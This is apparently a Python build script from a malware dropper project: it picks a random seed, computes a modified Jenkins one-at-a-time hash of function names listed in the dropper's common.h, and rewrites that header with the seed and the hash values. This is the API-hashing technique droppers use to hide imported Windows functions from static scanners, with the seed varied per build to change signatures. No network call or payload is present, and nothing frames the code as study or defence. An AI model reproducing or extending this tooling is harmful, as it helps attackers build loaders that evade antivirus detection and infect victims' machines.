import os
import random


def _select_hashing_method(string, initial_seed):
    return _jenkins_one_at_a_time_hash_32bit(string, initial_seed)

def _jenkins_one_at_a_time_hash_32bit(string, initial_seed):
    hash_value = 0
    
    if isinstance(string, str):
        string = string.encode('utf-8')
    
    for byte in string:
        hash_value += byte
        hash_value &= 0xFFFFFFFF
        hash_value += (hash_value << initial_seed)
        hash_value &= 0xFFFFFFFF
        hash_value ^= (hash_value >> 6)
        hash_value &= 0xFFFFFFFF
    
    hash_value += (hash_value << 3)
    hash_value &= 0xFFFFFFFF
    hash_value ^= (hash_value >> 11)
    hash_value &= 0xFFFFFFFF
    hash_value += (hash_value << 15)
    hash_value &= 0xFFFFFFFF
    
    return f"0x{hash_value:08x}"

def _fill_common_h(dropper_path, static_hashes, initial_seed):
    print(initial_seed)
    with open(os.path.join(dropper_path, 'common.h'), 'r') as f:
        lines = f.readlines()
    
    for index, line in enumerate(lines):
        if '#define' in line and 'INITIAL_SEED' in line:
            lines[index] = f"#define INITIAL_SEED\t{initial_seed}\n"
        
        if '#define' in line and '_HASH' in line:
            str_to_hash = line.split(' ')[1].split('_')[0]
            hash_value = static_hashes[str_to_hash]
            lines[index] = f"#define {str_to_hash}_HASH\t{hash_value}\n"
    
    with open(os.path.join(dropper_path, 'common.h'), 'w') as f:
        f.writelines(lines)

def compute_static_hashes(dropper_path):
    static_hashes = {}
    initial_seed = random.randint(1, 15)
    
    with open(os.path.join(dropper_path, 'common.h'), 'r') as f:
        lines = f.readlines()
    
    for line in lines:
        if '#define' in line and '_HASH' in line:
            str_to_hash = line.split(' ')[1].split('_')[0]
            hash_value = _select_hashing_method(str_to_hash, initial_seed)
            static_hashes[str_to_hash] = hash_value
    
    _fill_common_h(dropper_path, static_hashes, initial_seed)
